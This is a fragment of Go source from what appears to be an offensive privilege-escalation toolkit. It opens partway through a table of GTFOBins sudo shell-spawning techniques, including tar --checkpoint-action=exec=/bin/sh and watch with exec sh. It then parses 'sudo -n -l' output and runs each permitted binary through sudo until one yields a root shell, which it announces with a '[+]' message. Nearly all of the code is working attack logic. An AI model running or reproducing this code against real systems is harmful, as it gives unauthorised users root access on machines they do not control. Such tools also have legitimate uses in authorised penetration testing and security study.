	{"watch", []string{"-x", "sh", "-c", "reset; exec sh 1>&0 2>&0"}, nil},
	{"xargs", []string{"-a", "/dev/null", "sh"}, nil},
	{"cpulimit", []string{"-l", "100", "-f", "/bin/sh"}, nil},
	{"tar", []string{"-cf", "/dev/null", "/dev/null", "--checkpoint=1", "--checkpoint-action=exec=/bin/sh"}, nil},
}

// parseSudoL parses `sudo -l` output and returns a set of allowed basenames.
// Returns nil to mean "all commands allowed".
func parseSudoL(output string) map[string]bool {
	allowed := make(map[string]bool)
	allAllowed := false
	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)
		// Match patterns like "(ALL) ALL", "(ALL) NOPASSWD: ALL", "(ALL : ALL) ALL", etc.
		if strings.Contains(line, ")") {
			parenIdx := strings.LastIndex(line, ")")
			after := line[parenIdx+1:]
			after = strings.TrimSpace(after)
			// Strip tags like NOPASSWD:, PASSWD:, SETENV:
			for _, tag := range []string{"NOPASSWD:", "PASSWD:", "SETENV:", "SETENV: NOPASSWD:"} {
				after = strings.TrimPrefix(after, tag)
				after = strings.TrimSpace(after)
			}
			if after == "ALL" {
				allAllowed = true
			}
		}
		if strings.HasPrefix(line, "(") && strings.Contains(line, ")") {
			// Lines like "(root) NOPASSWD: /usr/bin/foo"
			idx := strings.Index(line, ")")
			rest := line[idx+1:]
			for _, tok := range strings.Fields(rest) {
				tok = strings.TrimRight(tok, ",")
				if strings.HasPrefix(tok, "/") {
					base := filepath.Base(tok)
					if base != "" && base != "." {
						allowed[base] = true
					}
				}
			}
		}
	}
	if allAllowed {
		return nil
	}
	return allowed
}

func handleGTFOBins(tk *Toolkit) bool {
	sudoPath, err := exec.LookPath("sudo")
	if err != nil {
		tk.log("sudo not found")
		return false
	}

	cmd := exec.Command(sudoPath, "-n", "-l")
	output, err := cmd.Output()
	if err != nil {
		tk.log("sudo -n -l failed (no passwordless sudo?): %v", err)
		return false
	}

	allowed := parseSudoL(string(output))
	if allowed != nil && len(allowed) == 0 {
		tk.log("No allowed commands found in sudo -l output")
		return false
	}

	if allowed == nil {
		tk.log("sudo -l shows ALL commands allowed")
	} else {
		tk.log("sudo -l shows allowed binaries: %v", keys(allowed))
	}

	for _, tech := range gtfobinsTechniques {
		if allowed != nil && !allowed[tech.binary] {
			continue
		}

		tk.log("GTFOBins: trying sudo %s %v", tech.binary, tech.args)

		args := append([]string{tech.binary}, tech.args...)
		cmd := exec.Command(sudoPath, args...)
		cmd.Stdin = os.Stdin
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		if len(tech.env) > 0 {
			cmd.Env = append(os.Environ(), tech.env...)
		}

		if err := cmd.Run(); err == nil {
			fmt.Printf("\n[+] sudo %s spawned a root shell\n", tech.binary)
			return true
		}
	}

	return false
}

func keys(m map[string]bool) []string {
	var out []string
	for k := range m {
		out = append(out, k)
	}
	return out
}

var _ fs.FS = exploitFS
